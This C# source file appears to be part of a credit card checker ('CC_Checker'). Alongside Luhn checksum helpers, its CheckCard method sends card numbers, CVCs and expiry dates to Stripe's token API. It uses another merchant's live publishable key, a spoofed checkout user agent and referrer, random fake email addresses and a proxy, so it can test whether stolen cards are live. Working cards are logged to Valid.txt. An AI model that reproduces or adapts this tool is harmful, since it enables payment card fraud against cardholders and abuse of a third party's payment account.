using System.Net;
using System.Security.Authentication;

namespace CC_Checker.Extensions
{
    public static class Extensions
    {

        public static readonly ThreadLocal<Random> RandomNumber = new ThreadLocal<Random>(() => { return new Random(); });


        // Convert to int.
        private static readonly Func<char, int> CharToInt = c => c - '0';

        private static readonly Func<int, bool> IsEven = i => i % 2 == 0;

        // New Double Concept => 7 * 2 = 14 => 1 + 4 = 5.
        private static readonly Func<int, int> DoubleDigit = i => (i * 2).ToString().ToCharArray().Select(CharToInt).Sum();

        /// <summary>
        /// Verify if the card number is valid.
        /// </summary>
        /// <param name="creditCardNumber"></param>
        /// <returns></returns>
        /// 
        public static string RemoveWhitespace(this string input)
        {
            return new string(input.ToCharArray()
                .Where(c => !Char.IsWhiteSpace(c))
                .ToArray());
        }

        public static bool IsAValidNumber(string number)
        {
            number = number.RemoveWhitespace();

            return (number
                .ToCharArray()
                .All(char.IsNumber) &&
                    !string.IsNullOrEmpty(number));
        }

        public static string CreateCheckDigit(string number)
        {
            if (!IsAValidNumber(number))
                throw new ArgumentException("Invalid number. Just numbers and white spaces are accepted in the string.");

            var digitsSum = number
                .RemoveWhitespace()
                .ToCharArray()
                .Reverse()
                .Select(CharToInt)
                .Select((digit, index) => IsEven(index) ? DoubleDigit(digit) : digit)
                .Sum();

            digitsSum = digitsSum * 9;

            return digitsSum
                .ToString()
                .ToCharArray()
                .Last()
                .ToString();
        }
        public static bool CheckLuhn(string creditCardNumber)
        {
            if (!IsAValidNumber(creditCardNumber))
                throw new ArgumentException("Invalid number. Just numbers and white spaces are accepted in the string.");

            var checkSum = creditCardNumber
                .RemoveWhitespace()
                .ToCharArray()
                .Select(CharToInt)
                .Reverse()
                .Select((digit, index) => IsEven(index + 1) ? DoubleDigit(digit) : digit)
                .Sum();

            return checkSum % 10 == 0;
        }

        private static readonly ReaderWriterLock LogLock = new();

        public static void WriteCard(string Data)
        {
            try
            {
                lock (LogLock)
                {
                    LogLock.AcquireReaderLock(int.MaxValue);

                    using var stream = new StreamWriter("Valid.txt", true);
                    stream.WriteLine(Data);
                }
            }
            finally
            {
                LogLock.ReleaseReaderLock();
            }
        }

        private static Random random = new Random();
        public static string RandomText(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        //check is card is live no charge
        public static async Task<bool> CheckCard(string cc_num, string cc_cvc, string exp_date)
        {
            try
            {
                var email = RandomText(12) + "@gmail.com";
                Random rnd = new Random();
                int time_on_page = rnd.Next(300000, 900000);
                Dictionary<string, string> PostParams = new Dictionary<string, string>
                {
                    {"email",  email},
                    {"validation_type",  "card"},
                    {"payment_user_agent",  "Stripe Checkout v3 checkout-manhattan (stripe.js/6c4e062)"},
                    {"referrer",  "https://packetstream.io/dashboard/deposit"},
                    {"card[number]",  cc_num},
                    {"card[exp_month]",  exp_date.Split("/")[0] },
                    {"card[exp_year]",  exp_date.Split("/")[1] },
                    {"card[cvc]",  cc_cvc },
                    {"card[name]",  email},
                    {"time_on_page", time_on_page.ToString()}, // make it unique
                    {"guid", Guid.NewGuid().ToString()},
                    {"muid", Guid.NewGuid().ToString()},
                    {"sid", Guid.NewGuid().ToString()},
                    {"key", "pk_live_oL5LKEBVEx4D8xz4KGWRGC4U00Mm9vMi6X"}
                };
                using HttpClient client = new HttpClient(new HttpClientHandler
                {
                    //ADD PROXY US
                    Proxy = new WebProxy(""),
                    UseProxy = true,
                    SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls
                });
                var response = await client.PostAsync("https://api.stripe.com/v1/tokens", new FormUrlEncodedContent(PostParams));
                if (response.StatusCode == HttpStatusCode.PaymentRequired)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[Invalid] " + cc_num + ":" + cc_cvc);
                    return false;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[Valid] " + cc_num + ":" + cc_cvc);
                    return true;
                }
            }
            catch (Exception)
            {

                return false;
            }
        }
    }
}